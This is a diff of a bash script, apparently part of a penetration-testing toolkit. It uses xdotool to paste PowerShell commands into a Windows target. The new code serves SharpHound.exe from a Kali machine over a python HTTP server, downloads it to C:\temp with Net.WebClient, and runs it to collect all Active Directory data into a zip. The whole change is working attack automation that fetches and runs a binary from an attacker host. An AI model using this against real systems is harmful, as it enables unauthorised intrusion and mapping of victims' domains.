@@ -4,20 +4,32 @@
 ps: Upload sharphound and execute
 '
 
-LOCATION="${SCRIPTS_DIR}/windows/bloodhound/.files"
-FILE="SharpHound.exe"
+source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
+source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
+source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
 
-ps_webclient_upload_file "${LOCATION}" "${FILE}"
+# Generate gui form
+generate_form "Zipfilename" "Port"
 
-# Generate GUI form items (label, type (optional: default text), name, default (optional))
-ZIP_FILENAME_FIELD=$(form_item  "zip filename" "zip_filenamemain")
+ZIP_FILENAME=${form_data["Zipfilename"]}
+PORT=${form_data["Port"]}
 
-# Generate GUI form
-generate_form "${ZIP_FILENAME_FIELD}"
+cd ${SCRIPTS_DIR}/windows/bloodhound/.files
+python3 -m http.server ${PORT} &
+HTTP_PID=$!
 
-ZIP_FILENAME=${form_data["zip_filename"]}
+TMP_FOLDER="C:\temp"
 
-paste_command "${FILE_LOCATION} -c All --zipfilename ${ZIP_FILENAME}"
+paste_command "New-Item -Path \"c:\\\" -Name "temp" -ItemType \"directory\""
+xdotool key Return
+sleep 0.8
+
+paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${PORT}/SharpHound.exe', '${TMP_FOLDER}\SharpHound.exe')"
+xdotool key Return
+sleep 2
+
+paste_command "${TMP_FOLDER}\SharpHound.exe -c All --zipfilename ${ZIP_FILENAME}"
 xdotool key Return
 
+sleep 60
 kill $HTTP_PID
